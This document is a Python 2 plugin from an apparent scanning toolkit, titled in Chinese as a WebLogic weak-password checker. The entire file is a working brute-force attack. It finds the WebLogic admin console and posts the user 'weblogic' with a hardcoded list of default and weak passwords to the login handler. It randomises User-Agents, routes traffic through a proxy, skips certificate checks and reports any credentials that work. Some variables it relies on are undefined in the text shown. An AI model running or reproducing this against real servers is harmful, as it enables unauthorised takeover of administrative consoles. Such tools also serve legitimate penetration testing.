#!/usr/bin/env python
# coding:utf-8
import logging
import lib.requests as requests
import random
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "weblogic_crackpass",
        "info": "Weblogic弱口令",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            try:
                login_url = domain+'/console/login/LoginForm.jsp'
                resp = requests.get(login_url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
                continue
            if "WebLogic" in resp.text and dict(resp.headers).has_key('set-cookie'):
                result.append('%s >>>> Weblogic管理口'%login_url)
                cookies={}
                for line in resp.headers['set-cookie'].split(';'):
                    if '=' in line:
                        name,value=line.strip().split('=',1)
                        cookies[name]=value
                flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/']
                user_list=['weblogic']
                pass_list=['weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
                for user in user_list:
                    for password in pass_list:
                        try:
                            login_url = domain+'/console/j_security_check'
                            data = {'j_username':user, 'j_password':password, 'j_character_encoding':'UTF-8'}
                            resp = requests.post(login_url, data=data, proxies=MY_PROXY, cookies=cookies, timeout=TIME_OUT, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                        except Exception,e:
                            logging.error(e)
                            continue
                        # print resp.text
                        for flag in flag_list:
                            if flag in resp.text:
                                result.append('%s >>>> 存在Weblogic弱口令%s:%s'%(domain,user,password))
        if len(result):
            return result